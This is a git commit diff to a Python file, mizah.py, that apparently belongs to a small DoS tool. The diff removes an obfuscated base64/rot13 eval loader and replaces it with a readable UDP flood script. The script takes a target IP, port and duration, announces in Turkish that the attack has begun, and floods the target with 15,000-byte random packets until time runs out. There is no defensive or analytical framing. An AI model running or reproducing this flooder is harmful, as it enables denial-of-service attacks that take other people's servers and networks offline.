23c6049c3c4e8b134b245a6defe443fda56d4911
Ender Yücel <94347285+mizahx@users.noreply.github.com>
2021-12-21 12:59:06 +0300

    Update mizah.py

--- mizah.py
+++ mizah.py
@@ -3,11 +3,26 @@ Python code obfuscated by mizah :)
  
 """
 
-import base64, codecs
-magic = 'IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IHNvY2tldCxyYW5kb20sc3lzLHRpbWUKIAppZiBsZW4oc3lzLmFyZ3YpPT0xOgogICAgc3lzLmV4aXQoJ0t1bGxhbsSxbSA6IHB5dGhvbiBtaXphaC5weSBpcCBwb3J0IGxlbmdodChULkUgPSAzMCknKQogCmRlZiBtaXphaGF0dGFjaygpOgogICAgcG9ydCA9IGludChzeXMuYXJndls'
-love = 'lKFxXVPNtVUWuozEjo3W0CFuHpaIyYRMuoUAyXIgjo3W0CG0jKDbtVPNtnKNtCFOmrKZhLKWaqyfkKDbtVPNtMUIlVQ0tnJ50XUA5pl5upzq2JmAqXDbtVPNtL2kiL2f9XTkuoJWxLGbjYUEcoJHhL2kiL2fcJ2E1pw4jKDbtVPNtMUIlLKEco249XQRfXTAfo2AeXPxeMUIlXFyoMUIlCwOqPvNtVPOjpzyhqPtaH2SfMZFkpfFkVR'
-god = 'R1cnVtdSA6ICAlczolcyBmb3IgJXMgU2FuaXllJyUoaXAscG9ydCxkdXIgb3IgJ2luZmluaXRlJykpCiAgICBzb2NrPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfREdSQU0pCiAgICBieXRlcz1yYW5kb20uX3VyYW5kb20oMTUwMDApCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHBvcnQ9KHJhbmRvb'
-destiny = 'F5lLJ5xnJ50XQRfZGHjZQNjZQNcYUOipaDcJ3WuozEjo3W0KDbtVPNtVPNtVTyzVTAfo2AeXPx8MUIlLKEco246PvNtVPNtVPNtVPNtVUAiL2fhp2IhMUEiXTW5qTImYPucpPkjo3W0XFxXVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPOvpzIunjbtVPNtpUWcoaDbW1AuoTGRfKYRfFOPnKE0nF4aXDcgnKcunTS0qTSwnltcPt=='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+#!/usr/bin/python
+import socket ,random ,sys ,time #line:2
+if len (sys .argv )==1 :#line:4
+    sys .exit ('Kullanım : python mizah.py ip port lenght(T.E = 30)')#line:5
+mizah ="Saldırı Başlamıştır. Aferin Denyo"#line:7
+def mizahattack ():#line:9
+    OOOOOO0OOOOOO00O0 =int (sys .argv [2 ])#line:10
+    O00OO00000O0OO0O0 =(True ,False )[OOOOOO0OOOOOO00O0 ==0 ]#line:11
+    OO00O00O0O0000OOO =sys .argv [1 ]#line:12
+    OOO0O0O0000000O0O =int (sys .argv [3 ])#line:13
+    OOOO00OO0O00OOO0O =(lambda :0 ,time .clock )[OOO0O0O0000000O0O >0 ]#line:14
+    O00O00O0O00O00O0O =(1 ,(OOOO00OO0O00OOO0O ()+OOO0O0O0000000O0O ))[OOO0O0O0000000O0O >0 ]#line:15
+    print (mizah )#line:16
+    O0O000O0OO00O00OO =socket .socket (socket .AF_INET ,socket .SOCK_DGRAM )#line:17
+    O000OO0O0O00OO0O0 =random ._urandom (15000 )#line:18
+    while True :#line:19
+        OOOOOO0OOOOOO00O0 =(random .randint (1 ,15000000 ),OOOOOO0OOOOOO00O0 )[O00OO00000O0OO0O0 ]#line:20
+        if OOOO00OO0O00OOO0O ()<O00O00O0O00O00O0O :#line:21
+            O0O000O0OO00O00OO .sendto (O000OO0O0O00OO0O0 ,(OO00O00O0O0000OOO ,OOOOOO0OOOOOO00O0 ))#line:22
+        else :#line:23
+            break #line:24
+    print ('Saldırı Bitmiştir.')#line:25
+mizahattack ()#line:26
